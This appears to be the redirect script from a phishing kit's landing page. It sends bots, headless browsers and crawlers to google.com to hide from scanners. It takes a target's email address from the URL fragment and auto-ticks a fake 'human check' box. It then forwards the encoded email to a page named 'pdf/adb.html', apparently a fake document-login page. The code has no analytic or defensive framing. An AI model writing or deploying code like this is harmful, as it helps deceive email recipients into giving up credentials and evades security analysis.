(function () {
  // Basic bot detection
  if (
    window.outerWidth === 0 ||
    window.outerHeight === 0 ||
    navigator.webdriver ||
    /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
  ) {
    window.location.href = "https://google.com";
    throw new Error("Bot detected");
  }

  function generateSecureToken(length = 64) {
    const array = new Uint8Array(length / 2);
    window.crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }

  function encodeData(data) {
    return btoa(encodeURIComponent(data))
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  }

  const hash = window.location.hash.substring(1);
  if (!hash || !hash.includes("@")) {
    window.location.href = "https://google.com";
    return;
  }

  // Store email and token and clean URL
  const email = hash;
  const token = generateSecureToken();

  sessionStorage.setItem("redirect_email", email);
  sessionStorage.setItem("redirect_token", token);

  history.replaceState(null, "", window.location.pathname + window.location.search);

  // Auto-check and redirect immediately
  const checkbox = document.getElementById("humanCheck");
  if (checkbox) {
    checkbox.checked = true;
    const encodedEmail = encodeData(email);
    const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
    
    // Redirect right after a tiny delay so checkbox visually updates
    setTimeout(() => {
      window.location.href = redirectUrl;
    }, 100); // 100 ms delay is enough to show checkbox checked briefly
  } else {
    // fallback if checkbox missing - redirect immediately
    const encodedEmail = encodeData(email);
    window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
  }
})();
